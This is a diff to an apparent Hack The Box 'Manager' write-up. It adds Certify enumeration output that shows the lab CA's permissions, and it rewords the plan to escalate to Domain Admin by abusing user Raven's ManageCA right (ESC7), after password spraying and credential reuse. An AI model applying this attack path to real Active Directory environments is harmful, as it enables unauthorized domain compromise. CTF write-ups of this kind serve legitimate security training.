@@ -11,6 +11,11 @@
 
 > Manager is a medium difficulty Windows machine which hosts an Active Directory environment with AD CS (Active Directory Certificate Services), a web server, and an SQL server. The foothold involves enumerating users using RID cycling and performing a password spray attack to gain access to the MSSQL service. The `xp_dirtree` procedure is then used to explore the filesystem, uncovering a website backup in the web-root. Extracting the backup reveals credentials that are reused to WinRM to the server. Finally, the attacker escalates privileges through AD CS via ESC7 exploitation.
 
+#### Skills Required
+
+- Windows Fundamentals
+- SMB Enumeration
+
 #### Skills learned
 
 - AD CS enumeration
@@ -18,7 +23,7 @@
 
 #### Tools Used
 
-- certify.exe
+- Certify.exe
 - certipy-ad
 - crackmapexec
 - evil-winrm
@@ -1227,6 +1232,88 @@ Info: Upload successful!
 
 ![Victim: raven](https://custom-icon-badges.demolab.com/badge/Victim-raven-64b5f6?logo=windows11&logoColor=white)
 
+`./certify.exe cas`:
+```
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate authorities
+[*] Using the search base 'CN=Configuration,DC=manager,DC=htb'
+
+
+[*] Root CAs
+
+    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb ←
+    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
+    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
+    Cert Start Date               : 7/27/2023 3:21:05 AM
+    Cert End Date                 : 7/27/2122 3:31:04 AM
+    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb
+
+
+
+[*] NTAuthCertificates - Certificates that enable authentication:
+
+    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb
+    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
+    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
+    Cert Start Date               : 7/27/2023 3:21:05 AM
+    Cert End Date                 : 7/27/2122 3:31:04 AM
+    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb
+
+
+[*] Enterprise/Enrollment CAs:
+
+    Enterprise CA Name            : manager-DC01-CA
+    DNS Hostname                  : dc01.manager.htb
+    FullName                      : dc01.manager.htb\manager-DC01-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb
+    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
+    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
+    Cert Start Date               : 7/27/2023 3:21:05 AM
+    Cert End Date                 : 7/27/2122 3:31:04 AM
+    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Deny   ManageCA, Read                             MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
+      Allow  ManageCA, ManageCertificates               MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
+      Allow  ManageCA, Enroll                           MANAGER\Raven                 S-1-5-21-4078382237-1492182817-2568127209-1116
+      Allow  Enroll                                     MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
+    Enrollment Agent Restrictions : None
+
+    Enabled Certificate Templates:
+        SubCA
+        DirectoryEmailReplication
+        DomainControllerAuthentication
+        KerberosAuthentication
+        EFSRecovery
+        EFS
+        DomainController
+        WebServer
+        Machine
+        User
+        Administrator
+
+
+
+Certify completed in 00:00:17.8208341
+```
+
 `./certify.exe find /vulnerable`:
 ```
    _____          _   _  __
@@ -1324,7 +1411,7 @@ Certificate Templates                   : [!] Could not find any certificate tem
 ```
 
 The report indicates that the user `Raven` possesses hazardous permissions, particularly having
-"ManageCA" rights over the Certification Authority. This implies that by leveraging the ESC7 scenario, we could potentially elevate our privileges to "Domain Admin" while operating as user `Raven`. A detailed explanation about the exploitation process for the ESC7 scenario can be found
+`ManageCA` rights over the Certification Authority. This implies that by leveraging the ESC7 scenario, we could potentially elevate our privileges to Domain Admin while operating as user `Raven`. A detailed explanation about the exploitation process for the ESC7 scenario can be found
 [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7).
 To exploit this, we'll need to first add `Raven` as an "officer", so that we can manage certificates and issue them manually.
 
